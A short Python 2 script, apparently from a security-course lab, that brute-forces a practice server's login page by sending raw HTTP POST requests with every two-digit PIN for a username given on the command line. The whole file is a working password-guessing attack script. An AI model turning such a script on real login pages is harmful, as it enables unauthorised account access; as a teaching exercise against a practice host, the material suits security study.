# bruteForce1.py

# bruteForcing login screen. 
# Nota Bene that you can have up to 100 connections on Apache servers
# before you have try a new port number.

# Possible usernames: bill, sally, ted, sue.
# Possible PIN: 00, 01, 02, ... , 98, 99

import socket, sys
socket.setdefaulttimeout(2)

s = socket.socket()

target = "attack.samsclass.info"
tport = 80

s.connect((target, tport))

# I was going to implement a nested for loop, but we only get
# 100 tries and it is better to just run the program 4 times.
#for possible_users in ["bill", "sue", "ted", "sally"]:
#	user = possibe_users

#user = raw_input('Username: ')
#user = raw_input('Username (ted, sally, bill, sue): ')
user = sys.argv[1]
print "Using username: " + user

for pin in range(00, 100):
	if pin < 10:
		pw = "0" + str(pin)
	else:
		pw = pin

	length = len(user) + len(str(pw)) + 5

	print "\nTrying pw as " + str(pw)
	print "\n"

	s.send("POST /python/login2.php HTTP/1.1\nHost: " + target \
		+ "\nContent-Length: " + str(length) \
		+ "\nContent-Type: application/x-www-form-urlencoded" \
		+ "\n\nu=" + user + "&p=" + str(pw))
	print s.recv(1024)

s.close()
